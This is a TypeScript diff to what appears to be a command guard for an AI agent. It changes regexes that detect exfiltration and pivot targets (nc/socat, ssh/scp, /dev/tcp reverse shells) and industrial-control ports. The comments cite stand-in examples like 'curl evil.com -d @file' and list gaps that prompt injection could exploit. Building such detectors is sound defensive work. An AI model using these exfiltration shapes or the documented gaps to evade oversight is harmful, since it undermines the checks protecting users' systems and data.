@@ -93,19 +93,33 @@ export function extractHosts(text: string): string[] {
 			hosts.add(m[0]);
 		}
 	}
-	// Bare hostnames in network-tool args — the vectors a prompt-injection would
-	// use to exfil/pivot without an http(s):// URL. Kept narrow (only after a
-	// known network command, after `@`, or in a /dev/tcp reverse-shell path) so
-	// they don't false-block ordinary dotted tokens like `script.py 8080`.
-	// Full coverage still belongs at the network egress layer, not text parsing.
-	for (const m of text.matchAll(/\b(?:nc|ncat|netcat|telnet|socat)\s+(?:-\S+\s+)*([a-z0-9-]+(?:\.[a-z0-9-]+)+)\b/gi)) {
+	// DEFENSE-IN-DEPTH ONLY (not an authoritative egress control — that must be a
+	// network-level allowlist; see the scope rule + docs). This catches the
+	// EXFIL/PIVOT SHAPES a prompt-injection would use without an http(s):// URL,
+	// while deliberately NOT extracting hosts from ordinary tool fetches
+	// (`pip install`, `git clone`, `curl https://github.com/tool`) so it does not
+	// false-block legitimate tooling. Known gaps it does NOT close (need egress
+	// control): IPv6 literals, DNS-tunnel via dig/nslookup, cross-call variable
+	// indirection (`H=evil.com; nc $H …`), base64/pipe-to-shell.
+
+	// Raw-socket tool target (reverse shell / pivot): first non-flag arg, bare
+	// single-label or dotted. Its first argument IS the host, so this is precise.
+	for (const m of text.matchAll(/\b(?:nc|ncat|netcat|telnet|socat)\s+(?:-\S+\s+)*([a-z][a-z0-9.-]*)\b/gi)) {
 		const h = m[1] && literalHostPrefix(m[1]);
 		if (h && !validIpv4(h)) hosts.add(normalizeHost(h));
 	}
-	for (const m of text.matchAll(/@([a-z0-9-]+(?:\.[a-z0-9-]+)+)\b/gi)) {
-		const h = m[1] && literalHostPrefix(m[1]); // user@host (ssh/scp/rsync pivot)
+	// NOTE: scheme-less `curl evil.com -d @file` exfil is deliberately NOT parsed
+	// here — distinguishing the curl TARGET from a host inside a `-d` data body
+	// (e.g. an email address) is not reliable with text parsing and caused false
+	// blocks. It is a documented gap for the network-egress allowlist to close.
+
+	// user@host — ONLY as an ssh/scp/sftp/rsync pivot target, so ordinary email
+	// addresses in request bodies / commit messages do not false-block.
+	for (const m of text.matchAll(/\b(?:ssh|scp|sftp|rsync)\b[^|;&]*?[a-z0-9._%+-]+@([a-z0-9-]+(?:\.[a-z0-9-]+)+)/gi)) {
+		const h = m[1] && literalHostPrefix(m[1]);
 		if (h && !validIpv4(h)) hosts.add(normalizeHost(h));
 	}
+	// /dev/tcp|udp/host reverse shell.
 	for (const m of text.matchAll(/\/dev\/(?:tcp|udp)\/([a-z0-9.-]+)\//gi)) {
 		const h = m[1] && literalHostPrefix(m[1]);
 		if (h && !validIpv4(h)) hosts.add(normalizeHost(h));
@@ -231,7 +245,10 @@ const SAFETY_OF_LIFE_RULE: RedLineRule = {
 		const patterns: RegExp[] = [
 			/\b(modbus|bacnet|dnp3|s7comm|profinet|ethernet\/ip|hl7|dicom)\b/i,
 			/\b(plcscan|modbus-cli|mbtget|opcua)\b/i,
-			/\b(?:-p\s*)?\b(502|20000|47808|44818|2404|102)\b(?=[\s,/]|$)/, // OT ports as scan targets
+			// OT/ICS ports, but ONLY in a real PORT position (-p / --port / :port) —
+			// not a bare integer, so `sleep 502`, `head -n 20000`, `.../102/` do
+			// not trip this highest-priority, scope-independent block.
+			/(?:-p\s*|--port[=\s]|:)(?:502|20000|47808|44818|2404|102)\b/i,
 		];
 		for (const p of patterns) {
 			if (p.test(inv.commandText)) {
